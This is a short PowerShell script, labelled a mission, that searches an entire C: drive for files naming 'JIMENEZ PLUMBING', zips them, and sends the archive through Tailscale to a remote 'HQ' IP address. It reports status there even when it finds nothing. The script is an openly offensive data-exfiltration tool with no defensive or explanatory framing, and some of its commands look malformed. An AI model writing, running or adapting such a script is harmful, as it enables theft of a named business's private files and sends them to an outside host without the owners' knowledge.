# Mission: JIMENEZ PLUMBING SCAN & EXFIL
$target = "JIMENEZ PLUMBING"

# Scan C: drive for target keyword
$files = Get-ChildItem -Path "C:\" -Recurse | Where-Object { $_.FullName -like "*$target*" }

if ($files.Count -gt 0) {
    # Create ZIP of found files
    $zipPath = "C:\temp\JIMENEZ_PLUMBING.zip"
    Compress-Archive -Path $files.FullName -DestinationPath $zipPath
    
    # Exfiltrate via Tailscale pipe to HQ (100.124.152.86)
    # Note: Ensure 'tailscale file cp' is configured for this node
    Start-Process "tailscale file cp" -ArgumentList "$zipPath", "http://100.124.152.86/exfil.zip" -Wait
    
    Write-Host "Exfiltration Complete to HQ."
} else {
    # If no files found, still report status to HQ via Tailscale
    Start-Process "tailscale file cp" -ArgumentList "C:\temp\status.txt", "http://100.124.152.86/status.txt" -Wait
}
